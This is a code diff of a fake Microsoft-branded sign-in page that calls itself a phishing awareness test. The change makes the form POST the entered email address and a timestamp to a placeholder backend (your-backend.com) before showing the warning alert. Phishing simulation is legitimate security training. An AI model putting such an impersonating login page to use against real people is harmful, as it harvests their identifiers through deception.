@@ -11,8 +11,8 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
         <h2>Sign in</h2>
         <form id="login-form">
-            <input type="email" name="username" placeholder="Email, phone, or Skype" required>
-            <input type="password" name="password" placeholder="Password" required>
+            <input type="email" id="username" placeholder="Email, phone, or Skype" required>
+            <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Sign in</button>
         </form>
         <p><a href="#">Forgot password?</a></p>
@@ -23,8 +23,18 @@
     <script>
         document.getElementById("login-form").addEventListener("submit", function(event) {
             event.preventDefault();
-            alert("⚠ This is a phishing awareness test. DO NOT enter your real credentials.");
-            window.location.href = "https://security.microsoft.com"; // Redirect to Microsoft Security page
+
+            const username = document.getElementById("username").value;
+            fetch("https://your-backend.com/api/track-attempt", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ email: username, timestamp: new Date().toISOString() })
+            }).then(() => {
+                alert("⚠ This is a phishing awareness test. DO NOT enter your real credentials.");
+                window.location.href = "https://security.microsoft.com"; // Redirect to Microsoft Security page
+            }).catch(error => console.error("Error:", error));
         });
     </script>
 </body>
